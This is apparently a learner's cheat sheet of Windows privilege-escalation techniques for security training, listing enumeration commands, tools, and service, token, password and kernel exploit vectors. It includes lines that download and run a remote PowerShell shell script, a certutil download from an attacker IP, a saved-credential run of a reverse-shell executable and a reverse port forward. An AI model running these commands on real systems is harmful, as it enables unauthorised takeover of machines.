---
description: >-
  at the end of the day, you have to picture the way. these tools can only guide
  you so much
---

# Windows PrivEsc

HKCU - Current User\
HKLM - Local Machine

{% embed url="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html" %}
Whole picture + Weak Services
{% endembed %}

{% embed url="https://benheater.com/thm-windows-privesc/" %}
No nonsense - straight to business
{% endembed %}

{% embed url="https://www.hackingarticles.in/windows-privilege-escalation-weak-registry-permission/" %}
Weak Registry
{% endembed %}

Watch out for ADS (Alternate data streams) - good way to hide data (`dir /r` lists it out for you)&#x20;

Host file -`C:\Windows\System32\drivers\etc\hosts`

## Commands

```
findstr /B /C "string" - grep basically
certutil -urlcache -f http://$IP/$PATH_TO_FILE - wget basically
searchsploit <keyword> - search for exploits here instead of google first lmao
searchsploit -m $ID - gets exploit code/script from db
icacls - ACL to files/directories
where /R c:\windows bash.exe

iwr -Uri "[file_url]" -OutFile "$env:TEMP\[file]"; 
iex "$env:TEMP\shell.ps1"
```

if psexec dont work, smbexec.py (half shell) or wmiexec

### Basic Info gathering

```
systeminfo - (ready exploits might be there for outdated versions)
wmic qfe - check patch history (wmi - windows management instrumentation command line quick fix engineering)
wmic logicaldisk get caption,description,providername
```

#### User Enumeration

```
whoami /priv /groups
net user (lists users on system)
net user $username - lists all relavant info of that user
net localgroup $groupname
```

#### Network Enumeration

```
ipconfig
arp -a
netstat -ano 
```

#### Password Hunting (Can automate)

```
findstr "/si password *.txt (look for string "password" in any txt file) 
```

#### AV Enumeration

```
sc query windefend
sc query <query> see what services are running
netsh advfirewall firewall dump
netsh firewall show state/config
```

## Automated Enumeration

#### GO TO

* winPEAS.exe
* PowerUp.ps1
* SharpUp.exe
* Rubeus.exe
* Certify.exe

#### TO BE SOON

* Seatbelt.exe
* Watson.exe
* Sherlock.ps1
* jaws-enum.ps1
* windows-exploit-suggester.py

Sherlock looks for a set of CVEs most famous

## Passwords and Port Forwarding

```
plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080
```

Password exploits

* Saved creds
* Registry - The registry can be searched for keys and values that contain the word "password":
* SAM (Security Account Manager)
* Pass the hash

```
cmdkey /list
runas /savecred /user:username C:\PrivEsc\reverse.exe
```

## Service Exploits

* Insecure Service Permissions
* Unquoted Service Path&#x20;
* Weak Registry Permissions (If writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users)

```
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc #check perms
sc qc daclsvc
```

## WSL

not sure if i need it at this point in time so do come back and check up

## Token Impersonation

like cookies for your computer

* Delegate - created for logging into machine or RDP
* Impersonate - "non-interactive" such as attaching network drive or domain login script&#x20;

```
whoami /priv 
```

msfvenom to generate powershell payload, check how to do it wo meterpreter tho

**getsystem** - Magic way to become Admin, DO NOT SPAM

3 methods

* Named Pipe impersonation (In memory/admin)
* Named Pipe impersonation (Dropper/admin) - most risky, will be flagged by AV cus inserting dll into disk
* Token Impersonation (In memory/admin) - Needs SeDebugPriveleges

## Kernel Exploits

Most basic zero skill vector - this why make sure your systems are always updated

windows-exploit-suggester.py does bitsss (update db before using tho, run locally: feed it systeminfo data and it will run it against its db)

it has exploits for diff builds of windows

MS10-059 and others very popular: focus on privelege escalation vulns mentioned&#x20;

## Further ones to watch

* Executable Files - \[Ben `AlwaysInstallElevated`]
* Startup Applications - \[Ben `Autorun`]
* DLL Hijacking - \[Ben DLL]

